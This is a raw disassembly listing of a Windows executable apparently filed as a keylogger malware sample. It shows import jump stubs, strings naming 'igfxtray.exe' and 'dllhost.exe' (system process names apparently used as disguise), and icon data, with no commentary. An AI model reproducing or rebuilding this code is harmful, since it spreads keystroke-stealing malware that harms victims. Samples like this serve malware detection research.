
malware_samples/keylogger/00092c4212f31387983e7e4b03d4f8362e58a43861d8073e71d20e95addeb8a2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	86 93 a3 72 f9 09    	xchg   %dl,0x9f972a3(%ebx)
  401006:	a3 72 ee 6a a4       	mov    %eax,0xa46aee72
  40100b:	72 44                	jb     0x401051
  40100d:	c2 a0 72             	ret    $0x72a0
  401010:	31 68 a4             	xor    %ebp,-0x5c(%eax)
  401013:	72 9b                	jb     0x400fb0
  401015:	6a a2                	push   $0xffffffa2
  401017:	72 29                	jb     0x401042
  401019:	19 a2 72 62 72 a4    	sbb    %esp,-0x5b8d9d8e(%edx)
  40101f:	72 ba                	jb     0x400fdb
  401021:	02 a3 72 c3 9f a1    	add    -0x5e603c8e(%ebx),%ah
  401027:	72 b7                	jb     0x400fe0
  401029:	70 a2                	jo     0x400fcd
  40102b:	72 41                	jb     0x40106e
  40102d:	09 a3 72 76 6a a2    	or     %esp,-0x5d95898e(%ebx)
  401033:	72 3a                	jb     0x40106f
  401035:	c3                   	ret
  401036:	a0 72 74 a2 a1       	mov    0xa1a27472,%al
  40103b:	72 6e                	jb     0x4010ab
  40103d:	02 a3 72 35 db a1    	add    -0x5e24ca8e(%ebx),%ah
  401043:	72 fe                	jb     0x401043
  401045:	c1 a1 72 f1 9f a1 72 	shll   $0x72,-0x5e600e8e(%ecx)
  40104c:	06                   	push   %es
  40104d:	03 a3 72 06 04 a3    	add    -0x5cfbf98e(%ebx),%esp
  401053:	72 ee                	jb     0x401043
  401055:	94                   	xchg   %eax,%esp
  401056:	a3 72 fd c0 a1       	mov    %eax,0xa1c0fd72
  40105b:	72 ea                	jb     0x401047
  40105d:	62 a3 72 74 9b a0    	bound  %esp,-0x5f648b8e(%ebx)
  401063:	72 10                	jb     0x401075
  401065:	c4 a1 72 96 95 a2    	les    -0x5d6a698e(%ecx),%esp
  40106b:	72 fd                	jb     0x40106a
  40106d:	a0 94 72 28 c6       	mov    0xc6287294,%al
  401072:	a1 72 f6 09 a3       	mov    0xa309f672,%eax
  401077:	72 0a                	jb     0x401083
  401079:	c3                   	ret
  40107a:	a1 72 87 9b a0       	mov    0xa09b8772,%eax
  40107f:	72 dc                	jb     0x40105d
  401081:	19 a2 72 93 95 a3    	sbb    %esp,-0x5c6a6c8e(%edx)
  401087:	72 85                	jb     0x40100e
  401089:	9a a0 72 40 3a a4 72 	lcall  $0x72a4,$0x3a4072a0
  401090:	f2 19 a2 72 df 47 a2 	repnz sbb %esp,-0x5db8208e(%edx)
  401097:	72 89                	jb     0x401022
  401099:	06                   	push   %es
  40109a:	a3 72 ba 03 a3       	mov    %eax,0xa303ba72
  40109f:	72 56                	jb     0x4010f7
  4010a1:	0f a2                	cpuid
  4010a3:	72 13                	jb     0x4010b8
  4010a5:	75 a4                	jne    0x40104b
  4010a7:	72 48                	jb     0x4010f1
  4010a9:	19 a2 72 5a c6 a1    	sbb    %esp,-0x5e39a58e(%edx)
  4010af:	72 7d                	jb     0x40112e
  4010b1:	69 a2 72 2b 94 a3 72 	imul   $0xa0e86772,-0x5c6bd48e(%edx),%esp
  4010b8:	67 e8 a0 
  4010bb:	72 37                	jb     0x4010f4
  4010bd:	a2 a1 72 3a 03       	mov    %al,0x33a72a1
  4010c2:	a3 72 3a 04 a3       	mov    %eax,0xa3043a72
  4010c7:	72 4a                	jb     0x401113
  4010c9:	6c                   	insb   (%dx),%es:(%edi)
  4010ca:	a2 72 e3 da a1       	mov    %al,0xa1dae372
  4010cf:	72 01                	jb     0x4010d2
  4010d1:	6c                   	insb   (%dx),%es:(%edi)
  4010d2:	a2 72 6e 03 a3       	mov    %al,0xa3036e72
  4010d7:	72 a9                	jb     0x401082
  4010d9:	fd                   	std
  4010da:	a2 72 7d ef a1       	mov    %al,0xa1ef7d72
  4010df:	72 a4                	jb     0x401085
  4010e1:	35 94 72 d7 a3       	xor    $0xa3d77294,%eax
  4010e6:	94                   	xchg   %eax,%esp
  4010e7:	72 f6                	jb     0x4010df
  4010e9:	6d                   	insl   (%dx),%es:(%edi)
  4010ea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4010eb:	72 c0                	jb     0x4010ad
  4010ed:	92                   	xchg   %eax,%edx
  4010ee:	a3 72 30 6c a2       	mov    %eax,0xa26c3072
  4010f3:	72 46                	jb     0x40113b
  4010f5:	06                   	push   %es
  4010f6:	a2 72 ed ee a2       	mov    %al,0xa2eeed72
  4010fb:	72 44                	jb     0x401141
  4010fd:	96                   	xchg   %eax,%esi
  4010fe:	a3 72 13 4e a2       	mov    %eax,0xa24e1372
  401103:	72 11                	jb     0x401116
  401105:	dd a2 72 ec 6b a2    	frstor -0x5d94138e(%edx)
  40110b:	72 af                	jb     0x4010bc
  40110d:	9f                   	lahf
  40110e:	a1 72 00 00 00       	mov    0x72,%eax
  401113:	00 00                	add    %al,(%eax)
  401115:	00 00                	add    %al,(%eax)
  401117:	00 0e                	add    %cl,(%esi)
  401119:	00 08                	add    %cl,(%eax)
  40111b:	00 00                	add    %al,(%eax)
  40111d:	00 00                	add    %al,(%eax)
  40111f:	00 69 31             	add    %ch,0x31(%ecx)
  401122:	40                   	inc    %eax
  401123:	00 50 31             	add    %dl,0x31(%eax)
  401126:	40                   	inc    %eax
  401127:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40112a:	08 00                	or     %al,(%eax)
	...
  401134:	19 32                	sbb    %esi,(%edx)
  401136:	40                   	inc    %eax
  401137:	00 0e                	add    %cl,(%esi)
  401139:	00 08                	add    %cl,(%eax)
  40113b:	00 00                	add    %al,(%eax)
  40113d:	00 00                	add    %al,(%eax)
  40113f:	00 7e 37             	add    %bh,0x37(%esi)
  401142:	40                   	inc    %eax
  401143:	00 5b 37             	add    %bl,0x37(%ebx)
  401146:	40                   	inc    %eax
  401147:	00 0e                	add    %cl,(%esi)
  401149:	00 08                	add    %cl,(%eax)
  40114b:	00 00                	add    %al,(%eax)
  40114d:	00 00                	add    %al,(%eax)
  40114f:	00 b9 3b 40 00 9a    	add    %bh,-0x65ffbfc5(%ecx)
  401155:	3b 40 00             	cmp    0x0(%eax),%eax
  401158:	0a 00                	or     (%eax),%al
  40115a:	04 00                	add    $0x0,%al
  40115c:	00 00                	add    %al,(%eax)
  40115e:	00 00                	add    %al,(%eax)
  401160:	8f                   	(bad)
  401161:	3d 40 00 85 3d       	cmp    $0x3d850040,%eax
  401166:	40                   	inc    %eax
  401167:	00 05 00 08 00 f0    	add    %al,0xf0000800
  40116d:	3e 40                	ds inc %eax
  40116f:	00 00                	add    %al,(%eax)
  401171:	00 00                	add    %al,(%eax)
  401173:	00 f7                	add    %dh,%bh
  401175:	3e 40                	ds inc %eax
  401177:	00 05 00 08 00 24    	add    %al,0x24000800
  40117d:	43                   	inc    %ebx
  40117e:	40                   	inc    %eax
  40117f:	00 00                	add    %al,(%eax)
  401181:	00 00                	add    %al,(%eax)
  401183:	00 33                	add    %dh,(%ebx)
  401185:	43                   	inc    %ebx
  401186:	40                   	inc    %eax
  401187:	00 05 00 08 00 b7    	add    %al,0xb7000800
  40118d:	44                   	inc    %esp
  40118e:	40                   	inc    %eax
  40118f:	00 00                	add    %al,(%eax)
  401191:	00 00                	add    %al,(%eax)
  401193:	00 be 44 40 00 05    	add    %bh,0x5004044(%esi)
  401199:	00 08                	add    %cl,(%eax)
  40119b:	00 27                	add    %ah,(%edi)
  40119d:	46                   	inc    %esi
  40119e:	40                   	inc    %eax
  40119f:	00 00                	add    %al,(%eax)
  4011a1:	00 00                	add    %al,(%eax)
  4011a3:	00 2e                	add    %ch,(%esi)
  4011a5:	46                   	inc    %esi
  4011a6:	40                   	inc    %eax
  4011a7:	00 05 00 08 00 08    	add    %al,0x8000800
  4011ad:	75 40                	jne    0x4011ef
  4011af:	00 00                	add    %al,(%eax)
  4011b1:	00 00                	add    %al,(%eax)
  4011b3:	00 0f                	add    %cl,(%edi)
  4011b5:	75 40                	jne    0x4011f7
	...
  4011bf:	00 ff                	add    %bh,%bh
  4011c1:	25 5c 10 40 00       	and    $0x40105c,%eax
  4011c6:	ff 25 94 10 40 00    	jmp    *0x401094
  4011cc:	ff 25 a4 10 40 00    	jmp    *0x4010a4
  4011d2:	ff 25 4c 10 40 00    	jmp    *0x40104c
  4011d8:	ff 25 3c 10 40 00    	jmp    *0x40103c
  4011de:	ff 25 c0 10 40 00    	jmp    *0x4010c0
  4011e4:	ff 25 20 10 40 00    	jmp    *0x401020
  4011ea:	ff 25 d8 10 40 00    	jmp    *0x4010d8
  4011f0:	ff 25 50 10 40 00    	jmp    *0x401050
  4011f6:	ff 25 d4 10 40 00    	jmp    *0x4010d4
  4011fc:	ff 25 c4 10 40 00    	jmp    *0x4010c4
  401202:	ff 25 9c 10 40 00    	jmp    *0x40109c
  401208:	ff 25 74 10 40 00    	jmp    *0x401074
  40120e:	ff 25 98 10 40 00    	jmp    *0x401098
  401214:	ff 25 2c 10 40 00    	jmp    *0x40102c
  40121a:	ff 25 04 10 40 00    	jmp    *0x401004
  401220:	ff 25 ec 10 40 00    	jmp    *0x4010ec
  401226:	ff 25 00 10 40 00    	jmp    *0x401000
  40122c:	ff 25 04 11 40 00    	jmp    *0x401104
  401232:	ff 25 b4 10 40 00    	jmp    *0x4010b4
  401238:	ff 25 54 10 40 00    	jmp    *0x401054
  40123e:	ff 25 84 10 40 00    	jmp    *0x401084
  401244:	ff 25 fc 10 40 00    	jmp    *0x4010fc
  40124a:	ff 25 f8 10 40 00    	jmp    *0x4010f8
  401250:	ff 25 f4 10 40 00    	jmp    *0x4010f4
  401256:	ff 25 90 10 40 00    	jmp    *0x401090
  40125c:	ff 25 8c 10 40 00    	jmp    *0x40108c
  401262:	ff 25 0c 11 40 00    	jmp    *0x40110c
  401268:	ff 25 38 10 40 00    	jmp    *0x401038
  40126e:	ff 25 e8 10 40 00    	jmp    *0x4010e8
  401274:	ff 25 dc 10 40 00    	jmp    *0x4010dc
  40127a:	ff 25 48 10 40 00    	jmp    *0x401048
  401280:	ff 25 68 10 40 00    	jmp    *0x401068
  401286:	ff 25 1c 10 40 00    	jmp    *0x40101c
  40128c:	ff 25 28 10 40 00    	jmp    *0x401028
  401292:	ff 25 cc 10 40 00    	jmp    *0x4010cc
  401298:	ff 25 00 11 40 00    	jmp    *0x401100
  40129e:	ff 25 80 10 40 00    	jmp    *0x401080
  4012a4:	ff 25 64 10 40 00    	jmp    *0x401064
  4012aa:	ff 25 78 10 40 00    	jmp    *0x401078
  4012b0:	ff 25 b8 10 40 00    	jmp    *0x4010b8
  4012b6:	ff 25 70 10 40 00    	jmp    *0x401070
  4012bc:	ff 25 ac 10 40 00    	jmp    *0x4010ac
  4012c2:	ff 25 08 10 40 00    	jmp    *0x401008
  4012c8:	ff 25 44 10 40 00    	jmp    *0x401044
  4012ce:	ff 25 08 11 40 00    	jmp    *0x401108
  4012d4:	ff 25 58 10 40 00    	jmp    *0x401058
  4012da:	ff 25 10 10 40 00    	jmp    *0x401010
  4012e0:	ff 25 0c 10 40 00    	jmp    *0x40100c
  4012e6:	ff 25 18 10 40 00    	jmp    *0x401018
  4012ec:	ff 25 f0 10 40 00    	jmp    *0x4010f0
  4012f2:	ff 25 c8 10 40 00    	jmp    *0x4010c8
  4012f8:	ff 25 6c 10 40 00    	jmp    *0x40106c
  4012fe:	ff 25 a0 10 40 00    	jmp    *0x4010a0
  401304:	ff 25 b0 10 40 00    	jmp    *0x4010b0
  40130a:	ff 25 a8 10 40 00    	jmp    *0x4010a8
  401310:	ff 25 14 10 40 00    	jmp    *0x401014
  401316:	ff 25 30 10 40 00    	jmp    *0x401030
  40131c:	ff 25 34 10 40 00    	jmp    *0x401034
  401322:	ff 25 e4 10 40 00    	jmp    *0x4010e4
  401328:	ff 25 24 10 40 00    	jmp    *0x401024
  40132e:	ff 25 d0 10 40 00    	jmp    *0x4010d0
  401334:	ff 25 40 10 40 00    	jmp    *0x401040
  40133a:	ff 25 bc 10 40 00    	jmp    *0x4010bc
  401340:	ff 25 88 10 40 00    	jmp    *0x401088
  401346:	ff 25 60 10 40 00    	jmp    *0x401060
  40134c:	ff 25 7c 10 40 00    	jmp    *0x40107c
  401352:	ff 25 e0 10 40 00    	jmp    *0x4010e0
  401358:	68 58 1a 40 00       	push   $0x401a58
  40135d:	e8 f0 ff ff ff       	call   0x401352
  401362:	00 00                	add    %al,(%eax)
  401364:	00 00                	add    %al,(%eax)
  401366:	00 00                	add    %al,(%eax)
  401368:	30 00                	xor    %al,(%eax)
  40136a:	00 00                	add    %al,(%eax)
  40136c:	50                   	push   %eax
  40136d:	00 00                	add    %al,(%eax)
  40136f:	00 40 00             	add    %al,0x0(%eax)
  401372:	00 00                	add    %al,(%eax)
  401374:	f2 49                	repnz dec %ecx
  401376:	10 3d 4a e8 87 44    	adc    %bh,0x4487e84a
  40137c:	97                   	xchg   %eax,%edi
  40137d:	7d fe                	jge    0x40137d
  40137f:	d7                   	xlat   %ds:(%ebx)
  401380:	ab                   	stos   %eax,%es:(%edi)
  401381:	3b 12                	cmp    (%edx),%edx
  401383:	95                   	xchg   %eax,%ebp
  401384:	00 00                	add    %al,(%eax)
  401386:	00 00                	add    %al,(%eax)
  401388:	00 00                	add    %al,(%eax)
  40138a:	01 00                	add    %eax,(%eax)
  40138c:	00 00                	add    %al,(%eax)
  40138e:	22 0d 0a 43 6f 6d    	and    0x6d6f430a,%cl
  401394:	69 67 66 78 74 72 61 	imul   $0x61727478,0x66(%edi),%esp
  40139b:	79 00                	jns    0x40139d
  40139d:	79 70                	jns    0x40140f
  40139f:	65 3d 30 0d 0a 69    	gs cmp $0x690a0d30,%eax
  4013a5:	67 66 78 74          	addr16 data16 js 0x40141d
  4013a9:	72 61                	jb     0x40140c
  4013ab:	79 2e                	jns    0x4013db
  4013ad:	65 78 65             	gs js  0x401415
  4013b0:	00 79 70             	add    %bh,0x70(%ecx)
  4013b3:	65 00 00             	add    %al,%gs:(%eax)
  4013b6:	00 00                	add    %al,(%eax)
  4013b8:	ff cc                	dec    %esp
  4013ba:	31 00                	xor    %eax,(%eax)
  4013bc:	05 88 40 7c 88       	add    $0x887c4088,%eax
  4013c1:	fe                   	(bad)
  4013c2:	20 03                	and    %al,(%ebx)
  4013c4:	40                   	inc    %eax
  4013c5:	a9 f4 c5 00 e8       	test   $0xe800c5f4,%eax
  4013ca:	d3 47 e4             	roll   %cl,-0x1c(%edi)
  4013cd:	23 2d 42 54 a6 e3    	and    0xe3a65442,%ebp
  4013d3:	1e                   	push   %ds
  4013d4:	4a                   	dec    %edx
  4013d5:	84 d0                	test   %dl,%al
  4013d7:	53                   	push   %ebx
  4013d8:	0b ef                	or     %edi,%ebp
  4013da:	c0 61 41 3a          	shlb   $0x3a,0x41(%ecx)
  4013de:	4f                   	dec    %edi
  4013df:	ad                   	lods   %ds:(%esi),%eax
  4013e0:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4013e6:	0c 00                	or     $0x0,%al
  4013e8:	aa                   	stos   %al,%es:(%edi)
  4013e9:	00 60 d3             	add    %ah,-0x2d(%eax)
  4013ec:	93                   	xchg   %eax,%ebx
	...
  401411:	74 05                	je     0x401418
  401413:	00 00                	add    %al,(%eax)
  401415:	8f 04 00             	pop    (%eax,%eax,1)
  401418:	00 00                	add    %al,(%eax)
  40141a:	07                   	pop    %es
  40141b:	00 66 72             	add    %ah,0x72(%esi)
  40141e:	6d                   	insl   (%dx),%es:(%edi)
  40141f:	4d                   	dec    %ebp
  401420:	61                   	popa
  401421:	69 6e 00 0d 01 0b 00 	imul   $0xb010d,0x0(%esi),%ebp
  401428:	64 6c                	fs insb (%dx),%es:(%edi)
  40142a:	6c                   	insb   (%dx),%es:(%edi)
  40142b:	68 6f 73 74 2e       	push   $0x2e74736f
  401430:	65 78 65             	gs js  0x401498
  401433:	00 03                	add    %al,(%ebx)
  401435:	00 00                	add    %al,(%eax)
  401437:	00 00                	add    %al,(%eax)
  401439:	19 01                	sbb    %eax,(%ecx)
  40143b:	00 42 00             	add    %al,0x0(%edx)
  40143e:	22 01                	and    (%ecx),%al
  401440:	23 3e                	and    (%esi),%edi
  401442:	04 00                	add    $0x0,%al
  401444:	00 6c 74 00          	add    %ch,0x0(%esp,%esi,2)
  401448:	00 36                	add    %dh,(%esi)
  40144a:	04 00                	add    $0x0,%al
  40144c:	00 00                	add    %al,(%eax)
  40144e:	00 01                	add    %al,(%ecx)
  401450:	00 02                	add    %al,(%edx)
  401452:	00 20                	add    %ah,(%eax)
  401454:	20 10                	and    %dl,(%eax)
  401456:	00 00                	add    %al,(%eax)
  401458:	00 00                	add    %al,(%eax)
  40145a:	00 e8                	add    %ch,%al
  40145c:	02 00                	add    (%eax),%al
  40145e:	00 26                	add    %ah,(%esi)
  401460:	00 00                	add    %al,(%eax)
  401462:	00 10                	add    %dl,(%eax)
  401464:	10 10                	adc    %dl,(%eax)
  401466:	00 00                	add    %al,(%eax)
  401468:	00 00                	add    %al,(%eax)
  40146a:	00 28                	add    %ch,(%eax)
  40146c:	01 00                	add    %eax,(%eax)
  40146e:	00 0e                	add    %cl,(%esi)
  401470:	03 00                	add    (%eax),%eax
  401472:	00 28                	add    %ch,(%eax)
  401474:	00 00                	add    %al,(%eax)
  401476:	00 20                	add    %ah,(%eax)
  401478:	00 00                	add    %al,(%eax)
  40147a:	00 40 00             	add    %al,0x0(%eax)
  40147d:	00 00                	add    %al,(%eax)
  40147f:	01 00                	add    %eax,(%eax)
  401481:	04 00                	add    $0x0,%al
  401483:	00 00                	add    %al,(%eax)
  401485:	00 00                	add    %al,(%eax)
  401487:	80 02 00             	addb   $0x0,(%edx)
	...
  40149e:	00 00                	add    %al,(%eax)
  4014a0:	00 80 00 00 80 00    	add    %al,0x800000(%eax)
  4014a6:	00 00                	add    %al,(%eax)
  4014a8:	80 80 00 80 00 00 00 	addb   $0x0,0x8000(%eax)
  4014af:	80 00 80             	addb   $0x80,(%eax)
  4014b2:	00 80 80 00 00 80    	add    %al,-0x7fffff80(%eax)
  4014b8:	80 80 00 c0 c0 c0 00 	addb   $0x0,-0x3f3f4000(%eax)
  4014bf:	00 00                	add    %al,(%eax)
  4014c1:	ff 00                	incl   (%eax)
  4014c3:	00 ff                	add    %bh,%bh
  4014c5:	00 00                	add    %al,(%eax)
  4014c7:	00 ff                	add    %bh,%bh
  4014c9:	ff 00                	incl   (%eax)
  4014cb:	ff 00                	incl   (%eax)
  4014cd:	00 00                	add    %al,(%eax)
  4014cf:	ff 00                	incl   (%eax)
  4014d1:	ff 00                	incl   (%eax)
  4014d3:	ff                   	(bad)
  4014d4:	ff 00                	incl   (%eax)
  4014d6:	00 ff                	add    %bh,%bh
  4014d8:	ff                   	(bad)
  4014d9:	ff 00                	incl   (%eax)
	...
  4014eb:	78 88                	js     0x401475
  4014ed:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4014f3:	88 88 88 88 70 00    	mov    %cl,0x708888(%eax)
  4014f9:	00 00                	add    %al,(%eax)
  4014fb:	7f ff                	jg     0x4014fc
  4014fd:	ff                   	(bad)
  4014fe:	ff                   	(bad)
  4014ff:	ff                   	(bad)
  401500:	ff                   	(bad)
  401501:	ff                   	(bad)
  401502:	ff                   	(bad)
  401503:	ff                   	(bad)
  401504:	ff                   	(bad)
  401505:	ff                   	(bad)
  401506:	ff 87 00 00 00 07    	incl   0x7000000(%edi)
  40150c:	f7 07 70 77 07 70    	testl  $0x70077770,(%edi)
  401512:	77 07                	ja     0x40151b
  401514:	70 77                	jo     0x40158d
  401516:	07                   	pop    %es
  401517:	77 70                	ja     0x401589
  401519:	00 00                	add    %al,(%eax)
  40151b:	00 7f 70             	add    %bh,0x70(%edi)
  40151e:	f7 0f 70 f7 0f 70    	testl  $0x700ff770,(%edi)
  401524:	f7 0f 70 f7 70 00    	testl  $0x70f770,(%edi)
  40152a:	00 00                	add    %al,(%eax)
  40152c:	07                   	pop    %es
  40152d:	77 0f                	ja     0x40153e
  40152f:	70 f7                	jo     0x401528
  401531:	0f 70 f7 0f          	pshufw $0xf,%mm7,%mm6
  401535:	70 f7                	jo     0x40152e
  401537:	0f 07                	sysret
  401539:	70 00                	jo     0x40153b
  40153b:	00 07                	add    %al,(%edi)
  40153d:	f8                   	clc
  40153e:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401544:	88 88 88 88 87 77    	mov    %cl,0x77878888(%eax)
  40154a:	00 00                	add    %al,(%eax)
  40154c:	07                   	pop    %es
  40154d:	f8                   	clc
  40154e:	82 28 88             	subb   $0x88,(%eax)
  401551:	88 88 88 88 87 88    	mov    %cl,-0x77787778(%eax)
  401557:	88 87 77 00 00 07    	mov    %al,0x7000077(%edi)
  40155d:	f8                   	clc
  40155e:	8a a8 88 88 80 00    	mov    0x808888(%eax),%ch
  401564:	00 00                	add    %al,(%eax)
  401566:	00 08                	add    %cl,(%eax)
  401568:	87 77 00             	xchg   %esi,0x0(%edi)
  40156b:	00 07                	add    %al,(%edi)
  40156d:	f8                   	clc
  40156e:	88 88 88 88 87 77    	mov    %cl,0x77878888(%eax)
  401574:	77 77                	ja     0x4015ed
  401576:	77 78                	ja     0x4015f0
  401578:	87 77 00             	xchg   %esi,0x0(%edi)
  40157b:	00 07                	add    %al,(%edi)
  40157d:	f8                   	clc
  40157e:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  401584:	88 88 88 88 87 77    	mov    %cl,0x77878888(%eax)
  40158a:	00 00                	add    %al,(%eax)
  40158c:	07                   	pop    %es
  40158d:	ff                   	(bad)
  40158e:	ff                   	(bad)
  40158f:	ff                   	(bad)
  401590:	ff                   	(bad)
  401591:	ff                   	(bad)
  401592:	ff                   	(bad)
  401593:	ff                   	(bad)
  401594:	ff                   	(bad)
  401595:	ff                   	(bad)
  401596:	ff                   	(bad)
  401597:	ff f7                	push   %edi
  401599:	77 00                	ja     0x40159b
  40159b:	00 00                	add    %al,(%eax)
  40159d:	77 77                	ja     0x401616
  40159f:	77 77                	ja     0x401618
  4015a1:	77 77                	ja     0x40161a
  4015a3:	77 77                	ja     0x40161c
  4015a5:	77 77                	ja     0x40161e
  4015a7:	77 78                	ja     0x401621
  4015a9:	77 00                	ja     0x4015ab
	...
  4015b7:	00 77 87             	add    %dh,-0x79(%edi)
  4015ba:	00 00                	add    %al,(%eax)
  4015bc:	00 00                	add    %al,(%eax)
  4015be:	77 77                	ja     0x401637
  4015c0:	77 77                	ja     0x401639
  4015c2:	77 77                	ja     0x40163b
  4015c4:	77 77                	ja     0x40163d
  4015c6:	77 77                	ja     0x40163f
  4015c8:	07                   	pop    %es
  4015c9:	78 00                	js     0x4015cb
  4015cb:	00 00                	add    %al,(%eax)
  4015cd:	00 7f 88             	add    %bh,-0x78(%edi)
  4015d0:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4015d6:	88 87 70 77 00 00    	mov    %al,0x7770(%edi)
  4015dc:	00 00                	add    %al,(%eax)
  4015de:	7f 8f                	jg     0x40156f
  4015e0:	ff                   	(bad)
  4015e1:	ff                   	(bad)
  4015e2:	ff                   	(bad)
  4015e3:	ff                   	(bad)
  4015e4:	ff                   	(bad)
  4015e5:	ff                   	(bad)
  4015e6:	ff 87 70 00 00 00    	incl   0x70(%edi)
  4015ec:	00 00                	add    %al,(%eax)
  4015ee:	7f 87                	jg     0x401577
  4015f0:	77 77                	ja     0x401669
  4015f2:	77 77                	ja     0x40166b
  4015f4:	77 77                	ja     0x40166d
  4015f6:	7f 87                	jg     0x40157f
  4015f8:	70 00                	jo     0x4015fa
  4015fa:	00 00                	add    %al,(%eax)
  4015fc:	00 00                	add    %al,(%eax)
  4015fe:	7f 80                	jg     0x401580
  401600:	66 66 00 00          	data16 data16 add %al,(%eax)
  401604:	00 66 7f             	add    %ah,0x7f(%esi)
  401607:	87 70 00             	xchg   %esi,0x0(%eax)
  40160a:	00 00                	add    %al,(%eax)
  40160c:	00 00                	add    %al,(%eax)
  40160e:	7f 80                	jg     0x401590
  401610:	66 66 7f ff          	data16 data16 jg 0x401613
  401614:	f0 66 7f 87          	lock data16 jg 0x40159f
  401618:	70 00                	jo     0x40161a
  40161a:	00 00                	add    %al,(%eax)
  40161c:	00 00                	add    %al,(%eax)
  40161e:	7f 80                	jg     0x4015a0
  401620:	66 00 7f ff          	data16 add %bh,-0x1(%edi)
  401624:	f0 66 7f 87          	lock data16 jg 0x4015af
  401628:	70 00                	jo     0x40162a
  40162a:	00 00                	add    %al,(%eax)
  40162c:	00 00                	add    %al,(%eax)
  40162e:	7f 80                	jg     0x4015b0
  401630:	66 7f 7f             	data16 jg 0x4016b2
  401633:	ff f0                	push   %eax
  401635:	66 7f 87             	data16 jg 0x4015bf
  401638:	70 00                	jo     0x40163a
  40163a:	00 00                	add    %al,(%eax)
  40163c:	00 00                	add    %al,(%eax)
  40163e:	7f 80                	jg     0x4015c0
  401640:	66 7f 4c             	data16 jg 0x40168f
  401643:	cc                   	int3
  401644:	c0 66 7f 87          	shlb   $0x87,0x7f(%esi)
  401648:	70 00                	jo     0x40164a
  40164a:	00 00                	add    %al,(%eax)
  40164c:	00 00                	add    %al,(%eax)
  40164e:	7f 80                	jg     0x4015d0
  401650:	6e                   	outsb  %ds:(%esi),(%dx)
  401651:	7f ff                	jg     0x401652
  401653:	f0 66 66 7f 87       	lock data16 data16 jg 0x4015df
  401658:	70 00                	jo     0x40165a
  40165a:	00 00                	add    %al,(%eax)
  40165c:	00 00                	add    %al,(%eax)
  40165e:	7f 80                	jg     0x4015e0
  401660:	6e                   	outsb  %ds:(%esi),(%dx)
  401661:	00 00                	add    %al,(%eax)
  401663:	00 66 66             	add    %ah,0x66(%esi)
  401666:	7f 87                	jg     0x4015ef
  401668:	70 00                	jo     0x40166a
  40166a:	00 00                	add    %al,(%eax)
  40166c:	00 00                	add    %al,(%eax)
  40166e:	7f 80                	jg     0x4015f0
  401670:	66 66 66 66 66 66 7f 	data16 data16 data16 data16 data16 data16 jg 0x4015ff
  401677:	87 
  401678:	70 00                	jo     0x40167a
  40167a:	00 00                	add    %al,(%eax)
  40167c:	00 00                	add    %al,(%eax)
  40167e:	7f 80                	jg     0x401600
  401680:	00 00                	add    %al,(%eax)
  401682:	00 00                	add    %al,(%eax)
  401684:	00 00                	add    %al,(%eax)
  401686:	7f 87                	jg     0x40160f
  401688:	70 00                	jo     0x40168a
  40168a:	00 00                	add    %al,(%eax)
  40168c:	00 00                	add    %al,(%eax)
  40168e:	7f 87                	jg     0x401617
  401690:	77 77                	ja     0x401709
  401692:	77 77                	ja     0x40170b
  401694:	77 77                	ja     0x40170d
  401696:	7f 87                	jg     0x40161f
  401698:	70 00                	jo     0x40169a
  40169a:	00 00                	add    %al,(%eax)
  40169c:	00 00                	add    %al,(%eax)
  40169e:	7f 88                	jg     0x401628
  4016a0:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4016a6:	88 87 70 00 00 00    	mov    %al,0x70(%edi)
  4016ac:	00 00                	add    %al,(%eax)
  4016ae:	07                   	pop    %es
  4016af:	ff                   	(bad)
  4016b0:	ff                   	(bad)
  4016b1:	ff                   	(bad)
  4016b2:	ff                   	(bad)
  4016b3:	ff                   	(bad)
  4016b4:	ff                   	(bad)
  4016b5:	ff                   	(bad)
  4016b6:	ff f7                	push   %edi
  4016b8:	70 00                	jo     0x4016ba
  4016ba:	00 00                	add    %al,(%eax)
  4016bc:	00 00                	add    %al,(%eax)
  4016be:	00 78 88             	add    %bh,-0x78(%eax)
  4016c1:	88 88 88 88 88 88    	mov    %cl,-0x77777778(%eax)
  4016c7:	8f                   	(bad)
  4016c8:	70 00                	jo     0x4016ca
  4016ca:	00 00                	add    %al,(%eax)
  4016cc:	00 00                	add    %al,(%eax)
  4016ce:	00 07                	add    %al,(%edi)
  4016d0:	77 77                	ja     0x401749
  4016d2:	77 77                	ja     0x40174b
  4016d4:	77 77                	ja     0x40174d
  4016d6:	77 77                	ja     0x40174f
  4016d8:	70 00                	jo     0x4016da
  4016da:	00 80 00 00 7f 00    	add    %al,0x7f0000(%eax)
  4016e0:	00 00                	add    %al,(%eax)
  4016e2:	3f                   	aas
  4016e3:	00 00                	add    %al,(%eax)
  4016e5:	00 1f                	add    %bl,(%edi)
  4016e7:	80 00 00             	addb   $0x0,(%eax)
  4016ea:	0f c0 00             	xadd   %al,(%eax)
  4016ed:	00 07                	add    %al,(%edi)
  4016ef:	e0 00                	loopne 0x4016f1
  4016f1:	00 03                	add    %al,(%ebx)
  4016f3:	e0 00                	loopne 0x4016f5
  4016f5:	00 01                	add    %al,(%ecx)
  4016f7:	e0 00                	loopne 0x4016f9
  4016f9:	00 01                	add    %al,(%ecx)
  4016fb:	e0 00                	loopne 0x4016fd
  4016fd:	00 01                	add    %al,(%ecx)
  4016ff:	e0 00                	loopne 0x401701
  401701:	00 01                	add    %al,(%ecx)
  401703:	e0 00                	loopne 0x401705
  401705:	00 01                	add    %al,(%ecx)
  401707:	e0 00                	loopne 0x401709
  401709:	00 01                	add    %al,(%ecx)
  40170b:	f0 00 00             	lock add %al,(%eax)
  40170e:	01 fc                	add    %edi,%esp
  401710:	00 00                	add    %al,(%eax)
  401712:	01 fc                	add    %edi,%esp
  401714:	00 00                	add    %al,(%eax)
  401716:	01 fc                	add    %edi,%esp
  401718:	00 00                	add    %al,(%eax)
  40171a:	03 fc                	add    %esp,%edi
  40171c:	00 00                	add    %al,(%eax)
  40171e:	0f fc 00             	paddb  (%eax),%mm0
  401721:	00 0f                	add    %cl,(%edi)
  401723:	fc                   	cld
  401724:	00 00                	add    %al,(%eax)
  401726:	0f fc 00             	paddb  (%eax),%mm0
